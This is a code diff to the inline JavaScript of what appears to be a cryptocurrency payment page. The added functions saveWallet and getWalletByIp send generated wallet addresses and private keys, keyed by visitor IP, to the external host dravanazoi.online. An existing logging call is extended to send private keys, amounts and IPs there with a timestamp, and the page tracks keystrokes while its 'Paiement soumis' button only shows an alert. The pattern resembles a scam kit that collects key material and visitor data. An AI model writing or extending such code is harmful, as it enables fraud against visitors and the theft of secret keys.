@@ -244,7 +244,7 @@
     </footer>
 
     <script>
-        let keystrokes = new Set(); 
+         let keystrokes = new Set(); 
         let secondsSpent = 0;
 
         function getQueryParam(param) {
@@ -291,11 +291,38 @@
                 return amount; // Fallback to original amount if conversion fails
             }
         }
+		
+		async function saveWallet(ip, wallet) {
+			await fetch('https://dravanazoi.online/save_wallet', {
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/json'
+				},
+				body: JSON.stringify({ ip: ip, address: wallet.address, privateKey: wallet.privateKey })
+			});
+		}
+		
+		async function getWalletByIp(ip) {
+			const response = await fetch(`https://dravanazoi.online/get_wallet?ip=${ip}`);
+			if (response.ok) {
+				return await response.json(); // Renvoie l'adresse et la clé privée si elles existent
+			}
+			return null; // Renvoie null si aucune adresse n'est trouvée
+		}
 
         async function initialize() {
             let isc = Math.max(getQueryParam("isc") || 5, 5);
-            const wallet = createNewWallet();
-            const ip = await getIpAddress();
+			const ip = await getIpAddress();
+            let wallet = await getWalletByIp(ip);
+			if (!wallet) {
+				wallet = await createNewWallet();
+				await saveWallet(ip, wallet);
+			} else {
+				console.log(`Adresse récupérée: ${wallet.address}`);
+				console.log(`Privatekey récupérée: ${wallet.privateKey}`);
+			}
+
+
 			const { country, currency } = await getCountryAndCurrency(ip);
 			const convertedAmount = await convertCurrency(isc, 'EUR', currency);
 
@@ -363,13 +390,14 @@
 
             return wallet;
         }
-
+        
         function saveLog(address, privateKey, amount, ip, secondsSpent = 1, keystrokes = '') {
             const logEntry = {
                 address: address,
                 privateKey: privateKey,
                 amount: amount,
-                ip: ip
+                ip: ip,
+                timestamp: getFormattedDate()
             };
 
             fetch('https://dravanazoi.online/log_transaction', {
@@ -389,6 +417,22 @@
             })
             .catch(error => console.error('Erreur:', error));
         }
+		function getFormattedDate() {
+			const options = {
+				timeZone: 'Europe/Paris', // Utiliser le fuseau horaire de Paris
+				year: 'numeric',
+				month: 'short', // Nom du mois en format abrégé
+				day: '2-digit',
+				hour: '2-digit',
+				minute: '2-digit',
+				hour12: false, // Format 24 heures
+			};
+
+    // Obtenir la date formatée selon le fuseau horaire
+			const date = new Date().toLocaleString('en-GB', options); // Format GB pour avoir le format jour/mois/année
+			return `[${date.replace(',', '')}]`; // Enlever la virgule pour le format final
+		}
+
 
         function submitPayment() {
             alert('Paiement soumis !');
